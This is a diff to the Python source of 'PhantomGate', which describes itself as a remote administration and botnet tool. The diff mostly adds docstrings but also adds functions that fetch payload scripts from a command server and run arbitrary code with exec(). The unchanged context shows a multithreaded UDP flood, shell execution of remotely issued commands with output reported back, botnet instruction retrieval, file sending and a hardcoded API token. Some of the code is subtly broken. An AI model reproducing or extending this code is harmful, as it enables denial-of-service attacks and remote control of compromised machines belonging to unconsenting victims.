@@ -9,8 +9,10 @@ A multi-purpose remote administration and botnet utility with features such as:
 - Botnet instruction retrieval and execution
 - Cross-platform support (Windows, Linux, Android detection)
 - Command output reporting to a central API
+This script is designed to be run as a standalone application, providing a command-line interface for interacting with a remote API server.
 
 Usage:
+
     python PhantomGate.py
 
 Main Features:
@@ -34,6 +36,7 @@ from sys import platform
 import socketserver
 import http.server
 import subprocess
+import contextlib
 import threading
 import requests
 import sqlite3
@@ -42,14 +45,18 @@ import string
 import random
 import socket
 import time
+import io
 import os
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 # os.system("clear")
-
-
 def opratingSystem():
+    """
+    Determines the operating system of the current machine.
+    Returns:
+        str: The name of the operating system (e.g., 'Windows', 'Linux', 'Android').
+    """
     if platform == "win32":
         return 'Windows'
     else:
@@ -61,6 +68,11 @@ def opratingSystem():
 
 
 def get_ip():
+    """
+    Retrieves the local IP address of the machine.
+    Returns:
+        str: The local IP address of the machine.
+    """
     s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     try:
         s.connect(('8.8.8.8',80))
@@ -79,7 +91,19 @@ lock = threading.Lock()
 stop_event = threading.Event()  
 
 def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY):
-    """UDP flood function for each thread."""
+    """
+    Sends UDP flood packets to the target IP on specified ports.
+    Args:
+        thread_id (int): Identifier for the thread.
+        ports (list): List of ports to target.
+        TARGET_IP (str): The target IP address.
+        PACKET_SIZE (int): Size of each UDP packet.
+        FAKE_HEADERS (list): List of fake headers to use in packets.
+        BASE_DELAY (float): Base delay between packet sends.
+        ADAPTIVE_THRESHOLD (int): Threshold for adaptive rate control.
+        MIN_DELAY (float): Minimum delay for adaptive control.
+        MAX_DELAY (float): Maximum delay for adaptive control.
+    """
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     delay = BASE_DELAY  
     packet_count = 0  
@@ -130,6 +154,13 @@ def command_interface(threads):
 
 # udp-flood(socket)
 def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
+    """
+    Initiates a UDP flood attack on the specified target IP with multiple threads.
+    Args:
+        TARGET_IP (str): The target IP address to flood.
+        THREAD_COUNT (int): Number of threads to use for the flood.
+        PACKET_SIZE (int): Size of each UDP packet to send.
+    """
     # deffult port
     ports = [
         21, # FTP
@@ -172,6 +203,7 @@ def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
 
 
 # setting varible
+buit_in_command = ['lib','server','excute_code']
 apiToken = "GKEGff99ZQo3gR2gCfCaSNCZq5NgvJpe5Byb37mmer8J5FUL4kjkVwuVjfxxghoX0OBREZR7jgweCXuscYKKdeu6bxpyNDsJ65uCmDBN2rap3n5eej3pZPYKR0ROmXkDoA1FWjpCvzPDS3w81fiCMwNxfpqegwMyWvzT5Nr5vlyv7FT9oJKrlVZHutPYuWXbMyss6qWD"
 
 logger = logging.getLogger(__name__)
@@ -195,6 +227,16 @@ def ID(n=5):
 
 
 def targetData(command, user_name=None, ID=None):
+    """
+    Manages target data in a SQLite database.
+    Args:
+        command (str): The command to execute ('create_target' or 'get').
+        user_name (str, optional): The name of the target to create.
+        ID (str, optional): The unique identifier for the target.
+    Returns:
+        str or list: A message indicating success or failure for 'create_target',
+                     or a list of all target data for 'get'.
+    """
     conn = sqlite3.connect('info.db')
     cursour = conn.cursor()
 
@@ -225,26 +267,98 @@ def targetData(command, user_name=None, ID=None):
         return data
 
 
-def CMD(com):
+def libApi(token,usePyload,save=True):
+    """
+    Retrieves a Python script from a local API server and optionally saves it to a file.
+    Args:
+        token (str): The API token for authentication.
+        usePyload (str): The name of the script to retrieve.
+        save (bool): Whether to save the script to a file (default is True).
+    Returns:
+        dict or str: A dictionary with a message if saved, or the script text if not saved.
+                     Returns 'invalid' if the request fails.
+    """
+    args = {"token": token,'ip': get_ip(),'os':opratingSystem(),'pyload': usePyload}
 
     try:
+        GET = requests.get(f'http://127.0.0.1:5000/api/lib/{usePyload}',params=args)
 
-        cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
-        output_bytes = cmd.stderr + cmd.stdout
-        output_string = str(output_bytes,'utf-8')
-        cmd_data = output_string
+    except:
+        return 'Error'
+    
+    response = GET.json()
+    valid = GET.status_code
 
-    except Exception as e:
-        output_string = str(output_bytes)
-        cmd_data = output_string
+    if valid == 200:
+        if save:
+            with open(f'{usePyload}.py','w',encode='utf-8') as f:
+                f.write(response.text)
+            return {'message':f'file saved.name={usePyload}.py'}
+        return {'message':response.text}
+    
+    return 'invalid'
 
-    if len(cmd_data) == 0:
-        cmd_data = 'done!'
 
-    return cmd_data
+def code_excuter(script):
+    """
+    Executes a Python script and captures its output.
+    Args:
+        script (str): The Python script to execute.
+    Returns:
+        str: The output of the executed script or an error message if execution fails.
+    """
+    try:
+        output_buffer = io.StringIO()
+        with contextlib.redirect_stdout(output_buffer):
+            exec(script)
+
+        output = output_buffer.getvalue()
+        return output
+    except:
+        return "Error executing code. Please check the script for errors."
+def CMD(com):
+    """
+    Executes a command in the shell and returns its output.
+    Args:
+        com (str): The command to execute.
+    Returns:
+        str: The output of the command or an error message if execution fails.
+    """
+
+    if com not in buit_in_command:
+        try:
+            cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
+            output_bytes = cmd.stderr + cmd.stdout
+            output_string = str(output_bytes,'utf-8')
+            cmd_data = output_string
+            
+        except Exception as e:
+            output_string = str(output_bytes)
+            cmd_data = output_string
+
+        if len(cmd_data) == 0:
+            cmd_data = 'done!'
+        return cmd_data
+    else:
+        if com.startswith('excute_code') and not len(com) == 11:
+            return code_excuter(com[11:])
+        elif com.startswith('server'):
+            ...
+        if com.startswith('ls'):
+            ls = os.listdir('.')
+            return ls
+
 
 
 def apiCommandGet(token,target_name):
+    """
+    Retrieves commands for a specific target from the API.
+    Args:
+        token (str): The API token for authentication.
+        target_name (str): The name of the target to retrieve commands for.
+    Returns:
+        list: A list of commands for the target, or 'invalid' if the request fails.
+    """
     args = {"token": token,'ip': get_ip(),'os':opratingSystem()}
 
     try:
@@ -264,6 +378,15 @@ def apiCommandGet(token,target_name):
 
 #3=cmd,target_name=2
 def apiCommandPost(token,data,target_name):
+    """
+    Posts command output to the API for a specific target.
+    Args:
+        token (str): The API token for authentication.
+        data (list): A list of tuples containing command IDs and their outputs.
+        target_name (str): The name of the target to post command output for.
+    Returns:
+        dict: A dictionary containing the response from the API, or 'Invalid' if the request fails.
+    """
     # data is all command recived from the api
     params= {
         'token': token,
@@ -289,6 +412,14 @@ def apiCommandPost(token,data,target_name):
 
 
 def BotNet(target_name,apiToken):
+    """
+    Retrieves botnet instructions for a specific target from the API.
+    Args:
+        target_name (str): The name of the target to retrieve botnet instructions for.
+        apiToken (str): The API token for authentication.
+    Returns:
+        tuple: A tuple containing the botnet instructions (udpflood, bruteFroce, customBotNet) or 'empty' if no instructions are available.
+    """
     botNet = requests.get(f'http://127.0.0.1:5000/api/BotNet/{target_name}',params={'token':apiToken,'ip':get_ip(),'os':opratingSystem()})
 
     if botNet.status_code == 200:
@@ -312,7 +443,14 @@ def BotNet(target_name,apiToken):
 
 
 def Registor(target_name, apiToken):
-
+    """
+    Registers a new target with the API.
+    Args:
+        target_name (str): The name of the target to register.
+        apiToken (str): The API token for authentication.
+    Returns:
+        dict: A dictionary containing the registration response from the API, or an error message if registration fails.
+    """
     info = {
         'token': apiToken,
         'target_name': target_name,
@@ -333,6 +471,14 @@ def Registor(target_name, apiToken):
 
 
 def Instarction(target_name, apiToken):
+    """
+    Retrieves instructions for a specific target from the API.
+    Args:
+        target_name (str): The name of the target to retrieve instructions for.
+        apiToken (str): The API token for authentication.
+    Returns:
+        dict: A dictionary containing the instructions for the target, or an error message if the request fails.
+    """
     info = {
         'token': apiToken,
         'ip': get_ip(),
@@ -358,6 +504,11 @@ def Instarction(target_name, apiToken):
 
 
 def apiMain():
+    """
+    Main function to handle the API interaction and command execution loop.
+    It retrieves target information, processes instructions, and executes commands
+    based on the retrieved instructions.
+    """
     while True:
         # Retrieve target info
         target_info = targetData(command='get')
@@ -424,7 +575,13 @@ def apiMain():
 
 
 def get_host_port(s1):
-
+    """
+    Extracts the IP and PORT from a string formatted as 'IP:PORT'.
+    Args:
+        s1 (str): The string containing the IP and PORT.
+    Returns:
+        tuple: A tuple containing the IP and PORT as strings.
+    """
     for i in range(0,len(s1)):
         if s1[i] == ":":
             IP = s1[:i]
@@ -433,7 +590,13 @@ def get_host_port(s1):
     return IP,PORT
 
 def dir_chacker(_pwd):
-
+    """
+    Checks the current working directory and returns the path without the leading directory.
+    Args:
+        _pwd (str): The command to get the current working directory.
+    Returns:
+        str: The current working directory without the leading directory.
+    """
     cmd = subprocess.Popen(_pwd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
     bytes = cmd.stdout.read() + cmd.stderr.read()
     string = str(bytes)
@@ -450,7 +613,12 @@ def dir_chacker(_pwd):
     
     
 def server_target(IP, PORT):
-
+    """
+    Starts a simple HTTP server to serve files from the current directory.
+    Args:
+        IP (str): The IP address to bind the server to.
+        PORT (int): The port number to bind the server to.
+    """
     #creating request handler with variable name handler
     handler = http.server.SimpleHTTPRequestHandler
     #binding the request with the ip and port as httpd
@@ -460,7 +628,12 @@ def server_target(IP, PORT):
         httpd.serve_forever()
             
 def send(com,_port):
-        
+        """
+        Sends a file over a socket connection.
+        Args:
+            com (str): The path to the file to be sent.
+            _port (int): The port number to connect to.
+        """
         _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         host = socket.gethostname()
 
@@ -484,6 +657,11 @@ def send(com,_port):
             _s.close()
 
 def main():
+    """
+    Main function to establish a socket connection and handle commands.
+    It connects to a server, retrieves the current working directory,
+    and listens for commands to execute, change directories, or start a server.
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
